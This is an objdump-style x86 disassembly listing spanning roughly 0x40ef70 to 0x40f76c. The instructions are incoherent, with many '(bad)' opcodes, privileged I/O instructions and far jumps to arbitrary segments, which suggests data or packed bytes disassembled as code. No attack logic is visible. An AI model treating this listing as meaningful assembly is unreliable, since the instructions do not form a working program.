  40ef70:	add    eax,0xdad8faec
  40ef75:	sahf   
  40ef76:	and    bh,BYTE PTR [ebp+0x56]
  40ef79:	and    BYTE PTR [edx+0x15],bl
  40ef7c:	test   BYTE PTR [ebx+ebx*8-0x6a],bl
  40ef80:	es dec edx
  40ef82:	sti    
  40ef83:	std    
  40ef84:	pushf  
  40ef85:	dec    eax
  40ef86:	adc    eax,0xc1665aca
  40ef8b:	sub    al,0x62
  40ef8d:	adc    eax,0xdde4ed83
  40ef92:	aad    0xd9
  40ef94:	cld    
  40ef95:	das    
  40ef96:	and    BYTE PTR [edi],bl
  40ef98:	pushf  
  40ef99:	xlat   BYTE PTR ds:[ebx]
  40ef9a:	and    cl,dl
  40ef9c:	shl    BYTE PTR [esp+edx*8-0x4c1ce78c],cl
  40efa3:	sub    esi,DWORD PTR [eax]
  40efa5:	mov    dh,al
  40efa7:	adc    esi,ebp
  40efa9:	out    dx,eax
  40efaa:	popa   
  40efab:	inc    ebp
  40efac:	jge    0x40efda
  40efae:	call   0x8a8a:0x9e6e44be
  40efb5:	inc    edx
  40efb6:	push   ebp
  40efb7:	push   edi
  40efb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40efb9:	xchg   DWORD PTR [edx+0x6e],edx
  40efbc:	sbb    eax,DWORD PTR [edx]
  40efbe:	jo     0x40efc8
  40efc0:	fcom   QWORD PTR [edx+0x2f667390]
  40efc6:	xor    ch,ah
  40efc8:	in     eax,0x17
  40efca:	aam    0x17
  40efcc:	jge    0x40f007
  40efce:	sub    edi,DWORD PTR [esi+0xf]
  40efd1:	mov    eax,0xfe05d054
  40efd6:	mov    eax,0x7b99deb7
  40efdb:	mov    ecx,0x167a9315
  40efe0:	mov    al,0x29
  40efe2:	enter  0x1144,0xcd
  40efe6:	inc    esp
  40efe7:	iret   
  40efe8:	fisttp WORD PTR [ebx+0xd]
  40efeb:	mov    ebx,0xacd0546e
  40eff0:	gs fcmovnbe st,st(0)
  40eff3:	shl    DWORD PTR [esi-0x61],cl
  40eff6:	and    DWORD PTR [esp+edi*2+0x1e],edi
  40effa:	or     BYTE PTR [eax],dl
  40effc:	sbb    al,0xcf
  40effe:	fadd   QWORD PTR [esi-0x3e2af401]
  40f004:	push   eax
  40f005:	test   eax,0x2051e7da
  40f00a:	push   edx
  40f00b:	adc    DWORD PTR ds:0x5a18c04a,esp
  40f011:	dec    ebx
  40f012:	and    bh,BYTE PTR [ebp+0x619a68e8]
  40f018:	mov    esp,0xf0436fe
  40f01d:	(bad)  
  40f01e:	loop   0x40f060
  40f020:	pusha  
  40f021:	std    
  40f022:	pop    esi
  40f023:	mov    eax,ds:0x880f1f1e
  40f028:	cmp    BYTE PTR [edx],0xbd
  40f02b:	rol    BYTE PTR [ebx+ecx*8],0x27
  40f02f:	sysret 
  40f031:	pop    ebx
  40f032:	hlt    
  40f033:	ins    BYTE PTR es:[edi],dx
  40f034:	adc    al,0xd
  40f036:	inc    esi
  40f037:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f038:	push   es
  40f039:	test   al,0xcd
  40f03b:	iret   
  40f03c:	mov    bh,0x7
  40f03e:	sahf   
  40f03f:	inc    ecx
  40f040:	out    dx,al
  40f041:	pop    esp
  40f042:	out    dx,eax
  40f043:	in     eax,0x43
  40f045:	data16 mov cl,0xd1
  40f048:	cmp    ah,BYTE PTR ds:[ebx+0x9082211]
  40f04f:	je     0x40f005
  40f051:	and    eax,0xafb8fda
  40f056:	int    0x52
  40f058:	sbb    bh,BYTE PTR [edi-0x20]
  40f05b:	aam    0xab
  40f05d:	mov    ecx,0x18b71550
  40f062:	aad    0x53
  40f064:	push   ebx
  40f065:	out    dx,eax
  40f066:	dec    edi
  40f067:	lea    ecx,ds:0xe261dbce
  40f06d:	repz leave 
  40f06f:	mov    edi,0xc7287e2c
  40f074:	fldcw  WORD PTR [ebp+0x147129bb]
  40f07a:	jmp    0xd2d5bab1
  40f07f:	mov    dh,BYTE PTR [ecx-0x1c542e4d]
  40f085:	mov    ebp,0xd4c8e435
  40f08a:	cld    
  40f08b:	xchg   ebp,eax
  40f08c:	mov    BYTE PTR [esi-0x6],dl
  40f08f:	retf   
  40f090:	loope  0x40f066
  40f092:	dec    edi
  40f093:	cmp    ebx,edi
  40f095:	mov    ds:0x251fa6b8,al
  40f09a:	stos   DWORD PTR es:[edi],eax
  40f09b:	jg     0x40f03f
  40f09d:	mov    WORD PTR [edi+ebp*8],gs
  40f0a0:	sub    DWORD PTR [edi],edi
  40f0a2:	adc    DWORD PTR [edi],ebx
  40f0a4:	mov    ah,0xf1
  40f0a6:	cdq    
  40f0a7:	mov    esp,0x4721b5ee
  40f0ac:	push   0xffffff8e
  40f0ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f0af:	scas   al,BYTE PTR es:[edi]
  40f0b0:	data16 into 
  40f0b2:	cmp    al,0xa
  40f0b4:	mov    esp,0x29453ead
  40f0b9:	push   ebx
  40f0ba:	retf   
  40f0bb:	dec    ebx
  40f0bc:	adc    cl,ch
  40f0be:	call   0x5b80:0x6ada1b58
  40f0c5:	ins    DWORD PTR es:[edi],dx
  40f0c6:	push   esp
  40f0c7:	mov    dl,0x10
  40f0c9:	(bad)  
  40f0ca:	clc    
  40f0cb:	mov    cs,ecx
  40f0cd:	out    dx,al
  40f0ce:	adc    DWORD PTR [ebx+0x2c],edx
  40f0d1:	ins    BYTE PTR es:[edi],dx
  40f0d2:	(bad)  
  40f0d3:	(bad)  
  40f0d4:	aas    
  40f0d5:	and    DWORD PTR [edx-0x491f0b25],ebx
  40f0db:	leave  
  40f0dc:	dec    eax
  40f0dd:	xchg   edx,eax
  40f0de:	sbb    eax,0x568d73f8
  40f0e3:	inc    ecx
  40f0e4:	push   esp
  40f0e5:	lds    edi,FWORD PTR [edx]
  40f0e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0e8:	ss out 0x5b,al
  40f0eb:	xor    DWORD PTR [edi-0x308495b9],esi
  40f0f1:	fdivr  QWORD PTR [ecx]
  40f0f3:	adc    bh,BYTE PTR [eax+eax*2]
  40f0f6:	hlt    
  40f0f7:	js     0x40f108
  40f0f9:	rol    DWORD PTR [edx+0x75],cl
  40f0fc:	out    dx,al
  40f0fd:	sub    al,0x96
  40f0ff:	addr16 fs lahf 
  40f102:	push   ds
  40f103:	out    dx,al
  40f104:	cli    
  40f105:	inc    esi
  40f106:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f107:	mov    BYTE PTR [edi-0x1b],bh
  40f10a:	cmp    ah,cl
  40f10c:	dec    ebx
  40f10d:	ins    DWORD PTR es:[edi],dx
  40f10e:	mov    bl,0xfe
  40f110:	push   0x5502490e
  40f115:	stc    
  40f116:	pop    ecx
  40f117:	and    BYTE PTR [ebp-0x2],dh
  40f11a:	sub    dl,ch
  40f11c:	sub    BYTE PTR [ecx+0x19],0x62
  40f120:	mov    ch,0x6d
  40f122:	xor    DWORD PTR [eax],edi
  40f124:	ja     0x40f148
  40f126:	enter  0x8720,0x4d
  40f12a:	xchg   ebx,eax
  40f12b:	cmp    al,0x86
  40f12d:	arpl   ax,bp
  40f12f:	jg     0x40f10d
  40f131:	in     al,dx
  40f132:	nop
  40f133:	dec    edx
  40f134:	sub    esi,esp
  40f136:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f137:	inc    eax
  40f138:	jl     0x40f171
  40f13a:	sub    ebp,DWORD PTR [eax+edx*8-0x63]
  40f13e:	sti    
  40f13f:	imul   ebp,esi,0x20
  40f142:	ins    BYTE PTR es:[edi],dx
  40f143:	push   ds
  40f144:	sbb    ebx,DWORD PTR [esi+0x7bdf636f]
  40f14a:	nop
  40f14b:	pop    ds
  40f14c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f14d:	rcl    DWORD PTR [eax-0x6d],0xa3
  40f151:	addr16 sahf 
  40f153:	sbb    dh,BYTE PTR es:[edx]
  40f156:	popf   
  40f157:	icebp  
  40f158:	mov    cl,0x95
  40f15a:	inc    esp
  40f15b:	mov    ds:0xabfbb8c1,al
  40f160:	xor    bl,BYTE PTR [esi-0x40]
  40f163:	sub    DWORD PTR [edx+0x78],ebp
  40f166:	xchg   ebx,eax
  40f167:	mov    esp,0xd8626329
  40f16c:	cmp    DWORD PTR ds:0xdd404539,0x79
  40f173:	cwde   
  40f174:	push   ecx
  40f175:	bnd call 0xe726e7ae
  40f17b:	ss mov eax,0x7cdf24b2
  40f181:	aas    
  40f182:	hlt    
  40f183:	inc    ecx
  40f184:	mov    esi,0xd26aac26
  40f189:	into   
  40f18a:	inc    ebx
  40f18b:	pop    esp
  40f18c:	arpl   WORD PTR [edi+0x22bb517],cx
  40f192:	popf   
  40f193:	retf   0xb141
  40f196:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f197:	pushf  
  40f198:	repz mov al,ds:0xbcb65698
  40f19e:	jl     0x40f1d3
  40f1a0:	add    dh,al
  40f1a2:	jmp    0x8407300
  40f1a7:	hlt    
  40f1a8:	not    DWORD PTR [ebx-0x2a4a257f]
  40f1ae:	int3   
  40f1af:	sub    eax,0x2306aa32
  40f1b4:	inc    ebx
  40f1b5:	fld    DWORD PTR [esp+ebp*1-0x3e6b78d9]
  40f1bc:	cmp    esi,DWORD PTR [edx+esi*4+0x5afdfec1]
  40f1c3:	stos   BYTE PTR es:[edi],al
  40f1c4:	les    esi,FWORD PTR [ebx]
  40f1c6:	xchg   ebp,eax
  40f1c7:	sbb    eax,DWORD PTR [edi+edx*1+0x39ebb7c3]
  40f1ce:	mov    dh,0x42
  40f1d0:	test   DWORD PTR [eax+ebp*2+0x5e],0x5fda85cf
  40f1d8:	and    esi,DWORD PTR [ecx-0x10]
  40f1db:	jnp    0x40f1fd
  40f1dd:	or     DWORD PTR [ebp+0x2a],edi
  40f1e0:	mov    ds:0xcef6a4,al
  40f1e5:	push   es
  40f1e6:	(bad)  
  40f1e7:	xor    eax,0x92ad05fe
  40f1ec:	mov    edi,0x6d297c51
  40f1f1:	in     eax,dx
  40f1f2:	push   0xa825cadc
  40f1f7:	cmp    ah,BYTE PTR [esp+ebp*2-0x19]
  40f1fb:	cmp    eax,DWORD PTR ds:0x78a7f653
  40f201:	neg    ebx
  40f203:	daa    
  40f204:	mov    eax,ds:0xd15dcb03
  40f209:	sbb    BYTE PTR [ebx+0x3f],al
  40f20c:	sub    ebx,DWORD PTR [ebx]
  40f20e:	jo     0x40f26c
  40f210:	jb     0x40f260
  40f212:	mov    edi,0xfa38eaf0
  40f217:	sbb    bl,dl
  40f219:	retf   
  40f21a:	add    esi,ebx
  40f21c:	je     0x40f20c
  40f21e:	(bad)  
  40f21f:	shl    DWORD PTR [edi-0x2a455368],1
  40f225:	fs imul ecx,DWORD PTR gs:[edi],0x6b0e18d6
  40f22d:	loopne 0x40f292
  40f22f:	mov    ch,0x80
  40f231:	push   edi
  40f232:	in     al,0xeb
  40f234:	pop    ecx
  40f235:	dec    eax
  40f236:	mov    ebp,0x4061f0ae
  40f23b:	(bad)  
  40f23c:	imul   DWORD PTR [ecx-0x717016c8]
  40f242:	jmp    0x40f262
  40f244:	ret    
  40f245:	inc    ebx
  40f246:	mov    WORD PTR [eax],?
  40f248:	fsubr  DWORD PTR [edx]
  40f24a:	mov    ds:0x55664b41,al
  40f24f:	mov    esi,0x81ee8d69
  40f254:	inc    ebp
  40f255:	(bad)  [ebp+0x295b32ea]
  40f25b:	mov    dh,0xc8
  40f25d:	call   0xca02:0xcfda5376
  40f264:	clc    
  40f265:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f266:	repnz mov bh,0x7c
  40f269:	idiv   DWORD PTR [esi]
  40f26b:	cwde   
  40f26c:	mul    edx
  40f26e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f26f:	retf   0x3108
  40f272:	inc    ebp
  40f273:	shl    BYTE PTR [ebp+eiz*8+0x32],cl
  40f277:	mov    ds:0x3046219e,eax
  40f27c:	js     0x40f202
  40f27e:	iret   
  40f27f:	cmp    bl,BYTE PTR [edx-0xd6651e8]
  40f285:	mov    ecx,0x9fd0b2d0
  40f28a:	cld    
  40f28b:	or     al,0x83
  40f28d:	rol    DWORD PTR [esi],1
  40f28f:	scas   eax,DWORD PTR es:[edi]
  40f290:	nop
  40f291:	sbb    eax,0xd06f821e
  40f296:	mov    ecx,0x1ccf27d8
  40f29b:	pop    es
  40f29c:	(bad)  
  40f29d:	or     edx,DWORD PTR [edx+edx*1+0x4c]
  40f2a1:	mov    al,BYTE PTR [ecx-0x4f]
  40f2a4:	jl     0x40f2d2
  40f2a6:	pop    edx
  40f2a8:	fadd   DWORD PTR [edx+0x5c]
  40f2ab:	int    0x6e
  40f2ad:	or     al,0xc4
  40f2af:	dec    edi
  40f2b0:	inc    ebx
  40f2b1:	in     eax,0x88
  40f2b3:	(bad)  
  40f2b4:	(bad)  
  40f2b5:	mov    ds:0x7f01acb3,eax
  40f2ba:	mov    ecx,0xea51167d
  40f2bf:	xor    DWORD PTR [eax-0x2f5f5f2b],ecx
  40f2c5:	dec    edi
  40f2c6:	aam    0x17
  40f2c8:	inc    eax
  40f2c9:	jmp    0x40f26b
  40f2cb:	and    bh,dl
  40f2cd:	push   0x5b05b16f
  40f2d2:	nop
  40f2d3:	adc    eax,0xce4f847a
  40f2d8:	pop    edx
  40f2d9:	or     cl,BYTE PTR [eax+0x4c]
  40f2dc:	mov    eax,es:0xbe9f7fb
  40f2e2:	inc    ebp
  40f2e3:	and    eax,0xd5e52209
  40f2e8:	cmp    BYTE PTR [ebp+0x3c6f0d46],bl
  40f2ee:	dec    eax
  40f2ef:	adc    DWORD PTR [edi],ebx
  40f2f1:	popf   
  40f2f2:	mov    dh,0x9b
  40f2f4:	push   esp
  40f2f5:	sub    eax,DWORD PTR [edx+0x77]
  40f2f8:	adc    DWORD PTR [ebp-0x58cc7ff3],edx
  40f2fe:	and    eax,0xe8adfde
  40f303:	hlt    
  40f304:	xor    eax,0x847e8f59
  40f309:	es stos BYTE PTR es:[edi],al
  40f30b:	pop    ds
  40f30c:	sub    al,0x9f
  40f30e:	iret   
  40f30f:	inc    edx
  40f310:	cdq    
  40f311:	cmc    
  40f312:	inc    eax
  40f313:	js     0x40f370
  40f315:	xor    al,BYTE PTR [ecx+0x65e8bc1b]
  40f31b:	push   esp
  40f31c:	or     al,0xc7
  40f31e:	mov    bl,0x7c
  40f320:	cmc    
  40f321:	imul   eax,DWORD PTR [edi+0x95ebfc5],0x12
  40f328:	call   0x7ccf2546
  40f32d:	mov    ebx,0xde63852f
  40f332:	mov    cl,0x3a
  40f334:	pushf  
  40f335:	imul   ecx,DWORD PTR [edi+0x18],0xc8130c4e
  40f33c:	cmp    ebp,DWORD PTR ds:0x465cdef7
  40f342:	test   BYTE PTR [esi-0x62],bl
  40f345:	jle    0x40f2d0
  40f347:	add    DWORD PTR [ebx],esi
  40f349:	sbb    al,0x60
  40f34b:	push   ebx
  40f34c:	test   al,0x47
  40f34e:	dec    BYTE PTR [ebx-0x10219f8d]
  40f354:	or     BYTE PTR [edx+0x14b5d06a],al
  40f35a:	sbb    al,0xee
  40f35c:	cmp    DWORD PTR [ebp-0x6d20fdb0],ecx
  40f362:	ret    0x758c
  40f365:	jle    0x40f39e
  40f367:	ret    0x4c14
  40f36a:	lods   eax,DWORD PTR cs:[esi]
  40f36c:	pusha  
  40f36d:	(bad)  
  40f36e:	jmp    0x1b3772d5
  40f373:	out    0x98,eax
  40f375:	rol    BYTE PTR [eax-0x3b9d9c01],1
  40f37b:	repnz stc 
  40f37d:	sbb    al,0x56
  40f37f:	(bad)  
  40f380:	imul   ebp,DWORD PTR [ebp+0x3f0d08ff],0xffffffdc
  40f387:	jl     0x40f332
  40f389:	pop    edx
  40f38a:	loop   0x40f3d6
  40f38c:	jns    0x40f3b5
  40f38e:	sbb    esi,DWORD PTR [eax+0x62]
  40f391:	aas    
  40f392:	imul   eax,DWORD PTR [esi],0x4e0a2513
  40f398:	mov    eax,0x11126af6
  40f39d:	call   0xf212033a
  40f3a2:	pop    es
  40f3a3:	scas   al,BYTE PTR es:[edi]
  40f3a4:	mov    ebp,0xd6393954
  40f3a9:	pop    esi
  40f3aa:	lock ror DWORD PTR [eiz*1-0x68586d90],cl
  40f3b2:	adc    DWORD PTR [edx-0x1a],edx
  40f3b5:	push   bp
  40f3b7:	out    0xc,eax
  40f3b9:	mov    dh,dl
  40f3bb:	sub    DWORD PTR [ebx-0x29],eax
  40f3be:	call   0x56b24e25
  40f3c3:	(bad)  
  40f3c4:	or     ebp,DWORD PTR [edx-0x4d]
  40f3c7:	push   edi
  40f3c8:	nop
  40f3c9:	jnp    0x40f410
  40f3cb:	sub    al,0xbe
  40f3cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f3ce:	fcomip st,st(5)
  40f3d0:	mov    ds:0xe6b36c70,al
  40f3d5:	xchg   edx,eax
  40f3d6:	inc    eax
  40f3d7:	pop    esp
  40f3d8:	add    al,0x79
  40f3da:	cwde   
  40f3db:	push   esi
  40f3dc:	pop    edi
  40f3dd:	imul   ebx,DWORD PTR [ecx],0xffffff9d
  40f3e0:	shl    BYTE PTR [esi],1
  40f3e2:	imul   ecx,DWORD PTR [eax],0xffffffd8
  40f3e5:	add    eax,0xe41e328a
  40f3ea:	xchg   edi,eax
  40f3eb:	test   BYTE PTR [edx-0x372afc85],ah
  40f3f1:	out    0x30,al
  40f3f3:	out    dx,eax
  40f3f4:	pop    eax
  40f3f5:	cs cmp eax,0x54d8c8c0
  40f3fb:	mov    DWORD PTR [ebp+0x666fbb31],edi
  40f401:	call   0xa631:0x192decf9
  40f408:	stos   DWORD PTR es:[edi],eax
  40f409:	mov    eax,0xeceee98d
  40f40e:	or     eax,0x27e5f9e2
  40f413:	ds pop ds
  40f415:	xchg   DWORD PTR [ebp-0x1da26392],ecx
  40f41b:	test   al,0xc9
  40f41d:	jno    0x40f3ff
  40f41f:	jp     0x40f485
  40f421:	mov    eax,ds:0x60872430
  40f426:	xchg   edx,eax
  40f427:	xor    al,0x20
  40f429:	data16 fnstcw WORD PTR [ecx+0x129399ef]
  40f430:	enter  0x8e87,0xac
  40f434:	repnz out dx,eax
  40f436:	inc    edx
  40f437:	fucomi st,st(1)
  40f439:	dec    ecx
  40f43a:	xor    eax,0xc87fd960
  40f43f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f440:	sahf   
  40f441:	leave  
  40f442:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f443:	mov    ah,BYTE PTR [ebp+0x43]
  40f446:	cs or  eax,0x63865578
  40f44c:	or     al,0x36
  40f44e:	push   edx
  40f450:	clc    
  40f451:	jne    0x40f42d
  40f453:	je     0x40f433
  40f455:	stos   DWORD PTR es:[edi],eax
  40f456:	push   ss
  40f457:	add    BYTE PTR [edx+esi*1+0x210b8fd6],bh
  40f45e:	xchg   DWORD PTR [edi-0x43706f3f],esi
  40f464:	scas   al,BYTE PTR es:[edi]
  40f465:	iret   
  40f466:	mov    ebp,0xac578858
  40f46b:	adc    eax,ecx
  40f46d:	jbe    0x40f4d8
  40f46f:	ja     0x40f4c2
  40f471:	gs pusha 
  40f473:	popf   
  40f474:	sub    DWORD PTR [edi+0x58098222],edi
  40f47a:	out    0xb5,eax
  40f47c:	out    dx,eax
  40f47d:	sub    BYTE PTR [esi+eiz*1-0x7bf42626],0xd4
  40f485:	ss cli 
  40f487:	cmp    eax,0xbfe874c1
  40f48c:	fs stos DWORD PTR es:[edi],eax
  40f48e:	inc    ebx
  40f48f:	dec    esi
  40f490:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f491:	lods   al,BYTE PTR ds:[esi]
  40f492:	push   esp
  40f493:	mov    bl,al
  40f495:	xor    BYTE PTR [eax+eax*1],0x0
	...
  40f511:	add    BYTE PTR [eax],al
  40f513:	add    ah,dh
  40f515:	test   BYTE PTR [eax-0x6b],cl
  40f518:	js     0x40f4f7
  40f51a:	std    
  40f51b:	in     eax,0xbe
  40f51d:	mov    bh,0x36
  40f51f:	ds jno 0x40f506
  40f522:	pop    edi
  40f523:	sti    
  40f524:	and    DWORD PTR [ecx+0x76b0000],0xd2480000
  40f52e:	xor    edx,esi
  40f530:	daa    
  40f531:	out    dx,eax
  40f532:	ficomp DWORD PTR [esp+ebp*4-0x2b]
  40f536:	mov    dl,0x67
  40f538:	or     eax,0xb89799c2
  40f53d:	jnp    0x40f527
  40f53f:	xchg   ecx,eax
  40f540:	dec    ebx
  40f541:	mul    DWORD PTR [edi+ebx*1-0x37]
  40f545:	fucomi st,st(5)
  40f547:	inc    esp
  40f548:	bound  edi,QWORD PTR [edx]
  40f54a:	and    dh,BYTE PTR [edi+ecx*8]
  40f54d:	fstp   DWORD PTR [esi]
  40f54f:	pop    ds
  40f550:	out    0x61,al
  40f552:	jmp    0x77fb:0x6240f8f9
  40f559:	sbb    eax,0xe3d468c0
  40f55e:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f560:	mov    bh,0x38
  40f562:	sahf   
  40f563:	mov    esi,cs
  40f565:	data16 shr ah,cl
  40f568:	adc    ch,bh
  40f56a:	or     al,BYTE PTR [ecx]
  40f56c:	ret    0x20dd
  40f56f:	jbe    0x40f5dd
  40f571:	mov    ss,WORD PTR [ebx+ebx*2]
  40f574:	adc    DWORD PTR [ecx-0x296f280f],edx
  40f57a:	in     al,0x93
  40f57c:	scas   eax,DWORD PTR es:[edi]
  40f57d:	mov    dh,0xfe
  40f57f:	dec    DWORD PTR [eax]
  40f581:	push   ecx
  40f582:	inc    eax
  40f583:	std    
  40f584:	sti    
  40f585:	cmp    BYTE PTR [ebx-0x3c],dl
  40f588:	outs   dx,DWORD PTR ds:[esi]
  40f589:	fs xor al,0xb6
  40f58c:	xchg   ebx,eax
  40f58d:	sar    BYTE PTR [esi+eiz*8-0x5f0efb3a],cl
  40f594:	ins    DWORD PTR es:[edi],dx
  40f595:	je     0x40f5e9
  40f597:	mov    ecx,0xc940d3ba
  40f59c:	outs   dx,BYTE PTR ds:[esi]
  40f59d:	lods   eax,DWORD PTR ds:[esi]
  40f59e:	sbb    eax,0xe969e342
  40f5a3:	jg     0x40f566
  40f5a5:	push   ds
  40f5a6:	jge    0x40f5f1
  40f5a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f5a9:	ins    DWORD PTR es:[edi],dx
  40f5aa:	ins    DWORD PTR es:[edi],dx
  40f5ab:	adc    DWORD PTR [ecx+eiz*1+0x2e],esp
  40f5af:	and    BYTE PTR [eax],0x2f
  40f5b2:	cli    
  40f5b3:	push   cs
  40f5b4:	jp     0x40f543
  40f5b6:	imul   ebp
  40f5b8:	jl     0x40f636
  40f5ba:	dec    edx
  40f5bb:	mov    ah,0xa1
  40f5bd:	push   esp
  40f5be:	mov    BYTE PTR [edx-0x7ef2f6ad],ah
  40f5c4:	xor    al,0x18
  40f5c6:	xor    bl,BYTE PTR [ecx+0xd]
  40f5c9:	adc    BYTE PTR [edx],dl
  40f5cb:	xchg   ebx,eax
  40f5cc:	mov    edi,DWORD PTR [eax]
  40f5ce:	adc    al,0xc0
  40f5d0:	adc    DWORD PTR [ecx-0x70],esp
  40f5d3:	sub    al,0x97
  40f5d5:	jmp    0x40f5fd
  40f5d7:	cmp    al,0x3b
  40f5d9:	outs   dx,BYTE PTR ds:[esi]
  40f5da:	out    0xdf,al
  40f5dc:	shl    DWORD PTR [edx-0x71],cl
  40f5df:	pop    esp
  40f5e0:	mov    ecx,0x72b772f5
  40f5e5:	test   BYTE PTR [esi],dh
  40f5e7:	xchg   bl,bh
  40f5e9:	jmp    0xa0d8:0xcfbe3836
  40f5f0:	ja     0x40f5ef
  40f5f2:	retf   0xa473
  40f5f5:	mov    cl,0x34
  40f5f7:	jp     0x40f637
  40f5f9:	dec    eax
  40f5fa:	add    cl,BYTE PTR [edi]
  40f5fc:	lds    esi,FWORD PTR [edx-0x6a]
  40f5ff:	adc    eax,0x4e41aab
  40f604:	push   0x2976be1e
  40f609:	inc    ecx
  40f60a:	inc    esp
  40f60b:	dec    ecx
  40f60c:	xchg   edi,eax
  40f60d:	popa   
  40f60e:	rol    DWORD PTR [ebp-0x10],1
  40f611:	(bad)  
  40f613:	jno    0x40f673
  40f615:	xor    esp,DWORD PTR [edx]
  40f617:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f618:	mov    eax,0x13e6e8b
  40f61d:	dec    edi
  40f61e:	xchg   esi,eax
  40f61f:	outs   dx,DWORD PTR ds:[esi]
  40f620:	pushf  
  40f621:	inc    esp
  40f622:	xor    ch,cl
  40f624:	shl    dh,1
  40f626:	mov    esi,0x558add86
  40f62b:	cmp    ebp,ebp
  40f62d:	mov    ds:0x40416679,al
  40f632:	les    ecx,FWORD PTR ds:0xe933c178
  40f638:	cmp    edi,DWORD PTR [esi-0x4cacfb2]
  40f63e:	enter  0x453d,0x9a
  40f642:	sbb    BYTE PTR [edi+eax*4+0xbd17790],ah
  40f649:	jne    0x40f641
  40f64b:	jp     0x40f6c8
  40f64d:	ret    0xa96c
  40f650:	(bad)  
  40f651:	int    0x44
  40f653:	mov    ah,0x17
  40f655:	aad    0x1d
  40f657:	push   edi
  40f658:	lods   eax,DWORD PTR ds:[esi]
  40f659:	fidiv  DWORD PTR [edi+0x572c25e4]
  40f660:	sub    esi,0xedc30add
  40f666:	push   es
  40f667:	add    DWORD PTR [ebp+ebp*4+0xa],eax
  40f66b:	out    0x33,al
  40f66d:	or     al,0x18
  40f66f:	xchg   BYTE PTR [ebp-0x2c665e66],ch
  40f675:	mov    edi,0xa485a7c
  40f67a:	pushf  
  40f67b:	add    DWORD PTR [ebx],eax
  40f67d:	call   0x9d7a:0x787c5b53
  40f684:	sub    BYTE PTR [eax+esi*1+0x76],ah
  40f688:	xchg   cl,bh
  40f68a:	jecxz  0x40f68e
  40f68c:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  40f68e:	clc    
  40f68f:	jecxz  0x40f6a7
  40f691:	retf   
  40f692:	int3   
  40f693:	push   ebx
  40f694:	xchg   DWORD PTR [ecx-0x246014ec],edx
  40f69a:	xor    al,BYTE PTR [ebx-0x73]
  40f69d:	inc    ebx
  40f69e:	or     BYTE PTR [edi+0x32],0x75
  40f6a2:	push   esp
  40f6a3:	das    
  40f6a4:	push   esp
  40f6a5:	bound  edi,QWORD PTR [edx+0x1c]
  40f6a8:	fyl2x  
  40f6aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f6ab:	sub    DWORD PTR [edi+0x5],edi
  40f6ae:	popa   
  40f6af:	and    cl,cl
  40f6b1:	mov    dl,0xa1
  40f6b3:	(bad)  
  40f6b6:	mov    bh,0xb1
  40f6b8:	sbb    dh,BYTE PTR [esp+eiz*4+0x74]
  40f6bc:	sub    DWORD PTR [ebp-0xe],ebx
  40f6bf:	xchg   edx,eax
  40f6c0:	out    dx,al
  40f6c1:	cs mov ecx,0xcc657916
  40f6c7:	xchg   esp,eax
  40f6c8:	mov    edx,0xbe209124
  40f6cd:	call   DWORD PTR [eax]
  40f6cf:	aam    0x1a
  40f6d1:	xchg   ebx,eax
  40f6d2:	xor    ah,dl
  40f6d4:	lods   al,BYTE PTR ds:[esi]
  40f6d5:	add    ax,0x12b8
  40f6d9:	imul   esp,DWORD PTR [edx],0x7c
  40f6dc:	dec    esp
  40f6dd:	mov    edi,0xf3ae6755
  40f6e2:	jno    0x40f6a6
  40f6e4:	xor    al,0x14
  40f6e6:	mov    ebp,0x93bcc542
  40f6eb:	les    esi,FWORD PTR [edx-0x2de649e4]
  40f6f1:	fisubr WORD PTR [ebx+0xa]
  40f6f4:	ins    BYTE PTR es:[edi],dx
  40f6f5:	fmul   st,st(5)
  40f6f7:	cwde   
  40f6f8:	in     al,0xae
  40f6fa:	mov    ebp,0x5cc1bfba
  40f6ff:	xchg   edx,eax
  40f700:	dec    ebx
  40f701:	push   ds
  40f702:	mov    al,0x38
  40f704:	cmp    dl,BYTE PTR [ecx]
  40f706:	pop    ds
  40f707:	das    
  40f708:	pop    esi
  40f709:	cld    
  40f70a:	into   
  40f70b:	or     DWORD PTR [ecx-0x611c606d],ebp
  40f711:	and    BYTE PTR [esi],dl
  40f713:	cmp    BYTE PTR ds:0x199eff84,al
  40f719:	inc    ebp
  40f71a:	pop    esi
  40f71b:	clc    
  40f71c:	(bad)  
  40f71d:	ficom  WORD PTR [esi+0x21]
  40f720:	add    eax,ebx
  40f722:	fadd   QWORD PTR [edi]
  40f724:	les    esi,FWORD PTR [eax-0xb28e78f]
  40f72a:	fs dec esp
  40f72c:	mov    eax,ds:0xfd769bc2
  40f731:	jo     0x40f755
  40f733:	adc    edi,ecx
  40f735:	mov    cl,al
  40f737:	mov    ds:0x27474f8d,eax
  40f73c:	loopne 0x40f6fe
  40f73e:	xchg   esp,eax
  40f73f:	cmp    eax,0xeca47d30
  40f744:	mov    ds:0xd5fe1822,al
  40f749:	cmp    BYTE PTR [edi+0x60],dh
  40f74c:	pop    esp
  40f74d:	fiadd  DWORD PTR [esi-0x3d38c875]
  40f753:	jp     0x40f73a
  40f755:	sub    ebx,DWORD PTR [ecx-0x60d46356]
  40f75b:	add    BYTE PTR [edi],ah
  40f75d:	dec    edx
  40f75e:	aam    0x4a
  40f760:	pop    eax
  40f761:	das    
  40f762:	mov    ah,0x2
  40f764:	jbe    0x40f73d
  40f766:	pop    esi
  40f767:	test   BYTE PTR [ebp-0x75],0x29
  40f76b:	int3   
  40f76c:	jge    0x40f738
